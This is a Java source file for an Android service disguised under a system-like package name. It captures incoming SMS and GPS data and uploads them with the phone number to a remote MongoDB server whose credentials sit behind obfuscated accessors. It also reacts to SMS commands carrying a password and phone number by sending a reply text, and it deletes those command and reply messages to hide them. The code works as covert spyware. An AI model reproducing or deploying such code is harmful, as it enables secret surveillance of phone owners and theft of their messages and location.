package android.service.app;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.RemoteException;
import android.service.app.db.Database;
import android.service.app.db.DatabaseHelper;
import android.service.app.db.data.Gps;
import android.service.app.db.data.Message;
import android.service.app.db.inventory.Device;
import android.service.app.db.sync.Sync;
import android.service.app.db.user.Account;
import android.service.app.utils.Log;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Pair;

import com.mongodb.MongoClient;
import com.mongodb.MongoClientURI;
import com.mongodb.client.FindIterable;
import com.mongodb.client.MongoCollection;
import com.mongodb.client.MongoCursor;
import com.mongodb.client.MongoDatabase;
import com.mongodb.client.MongoIterable;

import org.bson.Document;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Set;

public class Service extends android.app.Service
{
    public static final String DB_PROTOCOL = DatabaseHelper.ACCOUNT.a();
    public static final String DB_USER = DatabaseHelper.ACCOUNT.b();
    public static final String DB_PASSWORD = DatabaseHelper.ACCOUNT.c();
    public static final String DB_HOST = DatabaseHelper.ACCOUNT.d();
    public static final int DB_PORT = Integer.valueOf(DatabaseHelper.ACCOUNT.e());
    public static final String DB_NAME = DatabaseHelper.ACCOUNT.f();
    public static final String DB_AUTH = DatabaseHelper.ACCOUNT.g();

    public static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    public static final String ACCOUNTS = "accounts";
    public static final String SYNC = "sync";
    public static final String GPS = "gps";
    public static final String DEVICES = "devices";
    public static final String MESSAGES = "messages";
    public static final String OK = "ok ";
    public static final String SMS = "SMS";

    protected Handler handler = new Handler();
    public AndroidApplication app;
    private RemoteService.Stub remoteServiceStub;
    private boolean serviceStatus;
    private Device device = null;

    private static MongoDatabase getMongoDatabase()
    {
        System.setProperty("org.mongodb.async.type", "netty");
        String userPass = DB_USER + ":" + DB_PASSWORD + "@";
        MongoClientURI uri = new MongoClientURI(DB_PROTOCOL + userPass + DB_HOST + ":" + DB_PORT + "/" + DB_NAME + "?authSource=" + DB_AUTH);
        MongoClient mongoClient = new MongoClient(uri);
        MongoDatabase database = mongoClient.getDatabase(uri.getDatabase());
        Document ping = database.runCommand(new Document("ping", null));
        Log.v("ping=" + ping);
        return database;
    }

    @Override
    public void onCreate()
    {
        app = (AndroidApplication) getApplication();
        app.service = this;
        app.serviceOnCreate = true;
        serviceStatus = true;

        SmsObserver smsObserver = new SmsObserver(this, handler);
        IntentFilter smsFilter = new IntentFilter(SMS_RECEIVED);

        ReceiverManager receiverManager = ReceiverManager.init(getApplicationContext());
        if (!receiverManager.isReceiverRegistered(smsObserver.inSms))
        {
            receiverManager.registerReceiver(smsObserver.inSms, smsFilter, getApplicationContext());
            initDatabase(getApplicationContext());
        }

        fillDevice();

        Log.v("a" + DatabaseHelper.ACCOUNT.a());
    }

    private void fillDevice()
    {
        DatabaseHelper androidDatabase = getAndroidDatabase(getApplicationContext());
        device = androidDatabase.selectFirstDevice();
        Log.v("device=" + device);
        androidDatabase.close();
    }


    @Override
    public void onDestroy()
    {
        super.onDestroy();

        ReceiverManager receiverManager = ReceiverManager.init(getApplicationContext());
        SmsObserver smsObserver = new SmsObserver(this, handler);
        if (receiverManager.isReceiverRegistered(smsObserver.inSms))
        {
            receiverManager.unregisterReceiver(smsObserver.inSms, getApplicationContext());
        }

        serviceStatus = false;
    }

    public static void initDatabase(Context context)
    {
        try
        {
            //context.deleteDatabase(Database.ANDROID_V_1_5.databaseName);

            initLocalDatabase(context);

            DatabaseHelper localDatabase = getAndroidDatabase(context);
            CallbackHandler<DatabaseSyncOutput> handler = getStringCallbackHandler();
            RunExternalDatabaseSyncTask<String> syncTask = new RunExternalDatabaseSyncTask<>(localDatabase, context, handler);
            syncTask.execute();
        } catch (Exception e)
        {
            Log.v("e: " + e.getMessage());
            e.printStackTrace();
        }
    }

    @NonNull
    private static CallbackHandler<DatabaseSyncOutput> getStringCallbackHandler()
    {
        return new CallbackHandler<DatabaseSyncOutput>()
        {
            private DatabaseSyncOutput result;

            @Override
            public void handle(DatabaseSyncOutput result)
            {
                this.result = result;
                Log.v("result=" + result);
            }

            @Override
            public String toString()
            {
                return String.valueOf(result);
            }
        };
    }

    public static String getDeviceName()
    {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer))
        {
            return capitalize(model);
        } else
        {
            return capitalize(manufacturer) + " " + model;
        }
    }

    private static String capitalize(String s)
    {
        if (s == null || s.length() == 0)
        {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first))
        {
            return s;
        } else
        {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }

    @NonNull
    private static void initLocalDatabase(Context context)
    {
        DatabaseHelper androidDatabase = getAndroidDatabase(context);

        String deviceName = getDeviceName();
        Log.v("deviceName=" + deviceName);

        Device firstDevice = androidDatabase.selectFirstDevice();
        Log.v("firstDevice=" + firstDevice);
        Log.v("messages=" + androidDatabase.getMessages());
        if (firstDevice.isEmpty())
        {
            SQLiteDatabase database = androidDatabase.getWritableDatabase();
            database.beginTransaction();
            try
            {
                TelephonyManager tm = (TelephonyManager) context.getSystemService(TELEPHONY_SERVICE);
                String number = tm.getLine1Number();
                Log.v("number=" + number);

                String email = number + "_sawrus@gmail.com";
                int accountId = androidDatabase.addAccount(new Account(email));
                Log.v("accountId=" + accountId);

                Device device = new Device(deviceName, accountId);
                int deviceId = androidDatabase.addDevice(device);
                Log.v("deviceId=" + deviceId);

                Sync sync = new Sync(accountId, deviceId, device.getTableName());
                androidDatabase.updateOrInsertSyncIfNeeded(sync);

                database.setTransactionSuccessful();
            } finally
            {
                database.endTransaction();
            }
        } else
        {
            Sync sync = new Sync(firstDevice.getAccountId(), firstDevice.getId(), firstDevice.getTableName());
            androidDatabase.updateOrInsertSyncIfNeeded(sync);
        }

        androidDatabase.close();
    }

    private static void syncExternalDatabase(Context context, DatabaseHelper localDatabase)
    {
        MongoDatabase externalDatabase = getMongoDatabase();

        initExternalDatabase(externalDatabase);

        Device firstDevice = registerAccountAndDeviceIfNeeded(localDatabase, externalDatabase);
        if (firstDevice == null) return;

        syncMessages(localDatabase, externalDatabase, firstDevice);
        syncGps(localDatabase, externalDatabase, firstDevice);

        localDatabase.close();
        localDatabase = getAndroidDatabase(context);
        syncAll(localDatabase, externalDatabase);

        localDatabase.close();
    }

    private static void syncGps(DatabaseHelper localDatabase, MongoDatabase externalDatabase, Device device)
    {
        Set<Gps> localDatabaseGpsSet = localDatabase.getGpsSet();
        Log.v("internal:localDatabaseGpsSet=" + localDatabaseGpsSet);

        MongoCollection<Document> syncs = externalDatabase.getCollection(SYNC);
        String externalAccountId = device.getAccount(localDatabase.getReadableDatabase()).getEmail();
        FindIterable<Document> gpsSyncPoints = syncs.find(new Document(Sync.ACCOUNT_ID, externalAccountId).append(Sync.TABLE, DatabaseHelper.GPS.getTableName()));
        Log.v("external:gpsSyncPoints=" + gpsSyncPoints);
        Integer newGpsSyncId = null;

        MongoCursor<Document> iterator = gpsSyncPoints.iterator();
        boolean syncPointsExists = iterator.hasNext();
        Log.v("external:syncPointsExists=" + syncPointsExists);

        if (syncPointsExists)
        {
            Document gpsSync = iterator.next();
            Log.v("gpsSync=" + gpsSync);

            Integer gpsSyncId = (Integer) gpsSync.get(Sync.SYNC_ID);
            Log.v("external:gpsSyncId=" + gpsSyncId);

            List<Document> documents = new ArrayList<>();
            for (Gps gps : localDatabaseGpsSet)
            {
                if (!gps.isEmpty() && gps.getId() > gpsSyncId)
                {
                    Document document = new Document();
                    document.putAll(gps.getData());
                    document.put(Gps.DEVICE_ID, device.getName());
                    documents.add(document);

                    newGpsSyncId = gps.getId();
                    Log.v("candidate:newGpsSyncId=" + newGpsSyncId);
                }
            }

            Log.v("newGpsSyncId=" + newGpsSyncId);
            if (newGpsSyncId != null)
            {
                Log.v("gpsSet.insertMany:documents=" + documents);
                MongoCollection<Document> gpsSet = externalDatabase.getCollection(GPS);
                gpsSet.insertMany(documents);
                localDatabase.updateOrInsertSyncIfNeeded(new Sync(device.getAccountId(), newGpsSyncId, DatabaseHelper.GPS.getTableName()));
            }
        } else
        {
            List<Document> documents = new ArrayList<>();
            for (Gps gps : localDatabaseGpsSet)
            {
                if (!gps.isEmpty())
                {
                    Document document = new Document();
                    document.putAll(gps.getData());
                    document.put(Gps.DEVICE_ID, device.getName());
                    documents.add(document);

                    newGpsSyncId = gps.getId();
                }
            }

            Log.v("newGpsSyncId=" + newGpsSyncId);
            if (newGpsSyncId != null)
            {
                Log.v("gps.insertMany:documents=" + documents);
                MongoCollection<Document> gpsSet = externalDatabase.getCollection(GPS);
                gpsSet.insertMany(documents);
                localDatabase.updateOrInsertSyncIfNeeded(new Sync(device.getAccountId(), newGpsSyncId, DatabaseHelper.GPS.getTableName()));
            }
        }
    }

    public static abstract class CallbackHandler<T>
    {
        public abstract void handle(T result);
    }

    public static class DatabaseSyncOutput
    {
        private String output;

        public DatabaseSyncOutput(String output)
        {
            this.output = output;
        }

        @Override
        public String toString()
        {
            return "DatabaseSyncOutput{" +
                    "output='" + output + '\'' +
                    '}';
        }

        public String getOutput()
        {
            return output;
        }

        public void setOutput(String output)
        {
            this.output = output;
        }
    }

    private static class RunExternalDatabaseSyncTask<Input> extends AsyncTask<Input, Void, DatabaseSyncOutput>
    {
        DatabaseHelper localDatabase;
        Context context;
        CallbackHandler<DatabaseSyncOutput> handler;

        public RunExternalDatabaseSyncTask(DatabaseHelper localDatabase, Context context, CallbackHandler<DatabaseSyncOutput> handler)
        {
            this.localDatabase = localDatabase;
            this.context = context;
            this.handler = handler;
        }

        @SafeVarargs
        protected final DatabaseSyncOutput doInBackground(Input... voids)
        {
            try
            {
                syncExternalDatabase(context, localDatabase);
            } catch (Exception e)
            {
                e.printStackTrace();
                String output = "e:" + e.getMessage();
                Log.v(output);
                return new DatabaseSyncOutput(output);
            }
            return new DatabaseSyncOutput("Success!");
        }

        @Override
        protected void onPostExecute(DatabaseSyncOutput result)
        {
            handler.handle(result);
        }
    }

    private static void syncMessages(DatabaseHelper localDatabase, MongoDatabase externalDatabase, Device device)
    {
        Set<Message> localDatabaseMessages = localDatabase.getMessages();
        Log.v("internal:localDatabaseMessages=" + localDatabaseMessages);

        MongoCollection<Document> syncs = externalDatabase.getCollection(SYNC);
        String externalAccountId = device.getAccount(localDatabase.getReadableDatabase()).getEmail();
        FindIterable<Document> messageSyncPoints = syncs.find(new Document(Sync.ACCOUNT_ID, externalAccountId).append(Sync.TABLE, DatabaseHelper.MESSAGE.getTableName()));
        Log.v("external:messageSyncPoints=" + messageSyncPoints);
        Integer newMessageSyncId = null;

        MongoCursor<Document> iterator = messageSyncPoints.iterator();
        boolean syncPointsExists = iterator.hasNext();
        Log.v("external:syncPointsExists=" + syncPointsExists);

        if (syncPointsExists)
        {
            Document messageSync = iterator.next();
            Log.v("messageSync=" + messageSync);

            Integer messageSyncId = (Integer) messageSync.get(Sync.SYNC_ID);
            Log.v("external:messageSyncId=" + messageSyncId);

            List<Document> documents = new ArrayList<>();
            for (Message message : localDatabaseMessages)
            {
                if (!message.isEmpty() && message.getId() > messageSyncId)
                {
                    Document document = new Document();
                    document.putAll(message.getData());
                    document.put(Message.DEVICE_ID, device.getName());
                    documents.add(document);

                    newMessageSyncId = message.getId();
                    Log.v("candidate:newMessageSyncId=" + newMessageSyncId);
                }
            }

            Log.v("newMessageSyncId=" + newMessageSyncId);
            if (newMessageSyncId != null)
            {
                Log.v("messages.insertMany:documents=" + documents);
                MongoCollection<Document> messages = externalDatabase.getCollection(MESSAGES);
                messages.insertMany(documents);
                localDatabase.updateOrInsertSyncIfNeeded(new Sync(device.getAccountId(), newMessageSyncId, DatabaseHelper.MESSAGE.getTableName()));
            }
        } else
        {
            List<Document> documents = new ArrayList<>();
            for (Message message : localDatabaseMessages)
            {
                if (!message.isEmpty())
                {
                    Document document = new Document();
                    document.putAll(message.getData());
                    document.put(Message.DEVICE_ID, device.getName());
                    documents.add(document);

                    newMessageSyncId = message.getId();
                }
            }

            Log.v("newMessageSyncId=" + newMessageSyncId);
            if (newMessageSyncId != null)
            {
                Log.v("messages.insertMany:documents=" + documents);
                MongoCollection<Document> messages = externalDatabase.getCollection(MESSAGES);
                messages.insertMany(documents);
                localDatabase.updateOrInsertSyncIfNeeded(new Sync(device.getAccountId(), newMessageSyncId, DatabaseHelper.MESSAGE.getTableName()));
            }
        }
    }

    private static void syncAll(DatabaseHelper localDatabase, MongoDatabase externalDatabase)
    {
        Account account = localDatabase.selectFirstAccount();
        Log.v("account=" + account);

        Set<Sync> syncSet = localDatabase.getSyncSet();
        Log.v("syncSet=" + syncSet);

        MongoCollection<Document> syncs = externalDatabase.getCollection(SYNC);
        boolean isNotExistSyncPoints = syncs.count() == 0;
        Log.v("isNotExistSyncPoints=" + isNotExistSyncPoints);
        if (isNotExistSyncPoints)
        {
            List<Document> documents = new ArrayList<>();
            for (Sync sync : syncSet)
            {
                if (!sync.isEmpty())
                {
                    Document document = new Document();
                    document.putAll(sync.getData());
                    document.put(Sync.ACCOUNT_ID, account.getEmail());
                    documents.add(document);
                }
            }

            if (!documents.isEmpty()) syncs.insertMany(documents);
        } else
        {
            for (Sync sync : syncSet)
            {
                if (!sync.isEmpty())
                {
                    Document document = new Document();
                    document.putAll(sync.getData());
                    document.put(Sync.ACCOUNT_ID, account.getEmail());
                    Document result = syncs.findOneAndReplace(new Document(Sync.ACCOUNT_ID, account.getEmail()).append(Sync.TABLE, sync.getTable()), document);
                    Log.v("syncs.findOneAndReplace:result=" + result);
                    if (result == null) syncs.insertOne(document);
                }
            }
        }
    }

    @Nullable
    private static Device registerAccountAndDeviceIfNeeded(DatabaseHelper localDatabase, MongoDatabase externalDatabase)
    {
        Account firstAccount = localDatabase.selectFirstAccount();
        Log.v("firstAccount=" + firstAccount);
        if (!firstAccount.isEmpty())
        {
            Document account = new Document();
            account.putAll(firstAccount.getData());
            MongoCollection<Document> accounts = externalDatabase.getCollection(ACCOUNTS);
            if (accounts.count() == 0) accounts.insertOne(account);
            else
            {
                Document result = accounts.findOneAndReplace(new Document(Account.EMAIL, firstAccount.getEmail()), account);
                if (result == null) accounts.insertOne(account);
            }
        } else
        {
            Log.v("account not exist!");
            return null;
        }

        Device firstDevice = localDatabase.selectFirstDevice();
        Log.v("firstDevice=" + firstDevice);
        if (!firstDevice.isEmpty())
        {
            Document device = new Document();
            device.putAll(firstDevice.getData());
            device.put(Device.ACCOUNT_ID, firstAccount.getEmail());
            MongoCollection<Document> devices = externalDatabase.getCollection(DEVICES);
            if (devices.count() == 0) devices.insertOne(device);
            else
            {
                Document result = devices.findOneAndReplace(new Document(Device.NAME, firstDevice.getName()), device);
                if (result == null) devices.insertOne(device);
            }
        } else
        {
            Log.v("device not exist!");
            return null;
        }
        return firstDevice;
    }

    private static void initExternalDatabase(MongoDatabase externalDatabase)
    {
        MongoIterable<String> collectionNames = externalDatabase.listCollectionNames();
        MongoCursor<String> iterator = collectionNames.iterator();
        if (!iterator.hasNext())
        {
            externalDatabase.createCollection(ACCOUNTS);
            externalDatabase.createCollection(DEVICES);
            externalDatabase.createCollection(MESSAGES);
            externalDatabase.createCollection(SYNC);
            externalDatabase.createCollection(GPS);
        } else
        {
            List<String> collections = new ArrayList<>();
            while (iterator.hasNext())
            {
                collections.add(iterator.next());
            }

            if (!collections.contains(ACCOUNTS)) externalDatabase.createCollection(ACCOUNTS);
            if (!collections.contains(DEVICES)) externalDatabase.createCollection(DEVICES);
            if (!collections.contains(MESSAGES)) externalDatabase.createCollection(MESSAGES);
            if (!collections.contains(SYNC)) externalDatabase.createCollection(SYNC);
            if (!collections.contains(GPS)) externalDatabase.createCollection(GPS);
        }
    }

    @NonNull
    private static DatabaseHelper getAndroidDatabase(Context context)
    {
        return new DatabaseHelper(context, Database.ANDROID_V_1_5);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        Log.v("call onStartCommand");

        remoteServiceStub = new RemoteService.Stub()
        {
            public void sendString(String string) throws RemoteException
            {

            }
        };

        app.service = this;
        app.serviceOnCreate = false;

        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent)
    {
        return remoteServiceStub;
    }

    public void runSmsEvent(final String address, final String body, final boolean incoming, ContentResolver contentResolver)
    {
        final ContentResolver resolver = contentResolver == null ? getApplicationContext().getContentResolver() : contentResolver;
        Log.v("resolver=" + resolver + "; incoming=" + incoming);

        new Thread(new Runnable()
        {
            public void run()
            {
                String message = address + ": " + body;
                printMessageOnScreen(message);

                try
                {
                    if (incoming)
                        checkAndSendSmsIfNeeded();
                    else
                        removeOldSms(resolver);
                } catch (Exception e)
                {
                    printMessageOnScreen(e.getMessage());
                    e.printStackTrace();
                }

                saveMessageInDatabase(address, incoming, body);
            }
        }).start();
    }

    public void checkAndSendSmsIfNeeded()
    {
        ContentResolver resolver = getApplicationContext().getContentResolver();
        Cursor cursor = resolver.query(SmsObserver.SMS_URI, SmsObserver.columns, null, null, null);
        if (cursor == null) return;
        cursor.moveToFirst();

        String body = cursor.getString(SmsObserver.BODY);
        String[] split = body.split(" ");
        Pair<Integer, Integer> pair = getPair(cursor);
        if (pair == null) return;
        int passwordResult = pair.first;
        int phoneNumberResult = pair.second;

        if (passwordResult > 0 && phoneNumberResult > 0)
        {
            SmsManager sms = SmsManager.getDefault();
            String destinationAddress = split[phoneNumberResult];
            String password = split[passwordResult];
            String message = OK + password;
            printMessageOnScreen(destinationAddress + ": " + message);
            removeMessageById(resolver, cursor.getInt(SmsObserver.ID));
            sms.sendTextMessage(destinationAddress, null, message, null, null);
        }

        cursor.close();
    }


    public void removeOldSms(final ContentResolver resolver)
    {
        Cursor cursor = resolver.query(SmsObserver.SMS_URI, SmsObserver.columns, null, null, null);
        Log.v("cursor=" + cursor);
        if (cursor == null) return;

        final List<Integer> messagesForDelete = new ArrayList<>();

        cursor.moveToFirst();
        while (!cursor.isClosed())
        {
            String body = String.valueOf(cursor.getString(SmsObserver.BODY));
            Log.v("body=" + body);
            String[] split = body.split(" ");

            Pair<Integer, Integer> pair = getPair(cursor);
            if (pair == null) continue;

            int passwordResult = pair.first;
            int phoneNumberResult = pair.second;

            boolean isOkSms = split.length == 2 && body.toLowerCase().contains(OK.toLowerCase());
            boolean isSendSms = body.toLowerCase().contains(SMS.toLowerCase()) && (passwordResult > 0 || phoneNumberResult > 0);
            if (isOkSms || isSendSms)
                messagesForDelete.add(cursor.getInt(SmsObserver.ID));

            if (cursor.isLast()) break;
            boolean moveToNext = cursor.moveToNext();
            Log.v("moveToNext=" + moveToNext);
        }

        cursor.close();

        for (Integer messageId : messagesForDelete)
            removeMessageById(resolver, messageId);
    }

    private void deleteMessageById(ContentResolver resolver, Cursor cursor)
    {
        removeMessageById(resolver, cursor.getInt(SmsObserver.ID));
    }

    private void removeMessageById(ContentResolver resolver, int messageId)
    {
        try
        {
            int result = resolver.delete(Uri.parse(SmsObserver.CONTENT_SMS + messageId), null, null);
            printMessageOnScreen("deleting SMS/id: " + messageId + "; result: " + result);
        } catch (Exception e)
        {
            printMessageOnScreen("deleting SMS/id e: " + e.getMessage());
            e.printStackTrace();
        }
    }

    public static Pair<Integer, Integer> getPair(Cursor cursor)
    {
        String body = cursor.getString(SmsObserver.BODY);
        String[] split = body.split(" ");

        Log.v("messageParts=" + Arrays.asList(split));

        int passwordIndex = -1;
        int phoneNumberIndex = -1;
        int length = split.length;
        for (int i = 0; i < length; i++)
        {
            final String part = split[i];
            String toLowerCase = String.valueOf(part).toLowerCase();
            if (SmsObserver.passwordPrefixes.contains(toLowerCase))
            {
                passwordIndex = i;
            } else if (SmsObserver.phonePrefixes.contains(toLowerCase))
            {
                phoneNumberIndex = i;
            }
        }
        Log.v("passwordIndex=" + passwordIndex);
        Log.v("phoneNumberIndex=" + phoneNumberIndex);

        int passwordResult = passwordIndex < length ? passwordIndex + 1 : -1;
        int phoneNumberResult = phoneNumberIndex < length ? phoneNumberIndex + 1 : -1;
        Log.v("passwordResult=" + passwordResult);
        Log.v("phoneNumberResult=" + phoneNumberResult);

        return new Pair<>(passwordResult, phoneNumberResult);
    }

    public void printMessageOnScreen(String message)
    {
        Log.v("message=" + message);

        Intent i = new Intent("EVENT_UPDATED");
        i.putExtra("<Key>", message);
        sendBroadcast(i);
    }

    private void saveMessageInDatabase(String address, boolean incoming, String body)
    {
        DatabaseHelper androidDatabase = getAndroidDatabase(getApplicationContext());
        Device device = androidDatabase.selectFirstDevice();
        Log.v("device=" + device);

        SQLiteDatabase database = androidDatabase.getWritableDatabase();
        database.beginTransaction();
        try
        {
            androidDatabase.addMessage(new Message(address, incoming, body, device.getId()));
            database.setTransactionSuccessful();
        } finally
        {
            database.endTransaction();
        }

        Set<Message> localDatabaseMessages = androidDatabase.getMessages();
        Log.v("internal:localDatabaseMessages=" + localDatabaseMessages);

        androidDatabase.close();
    }
}
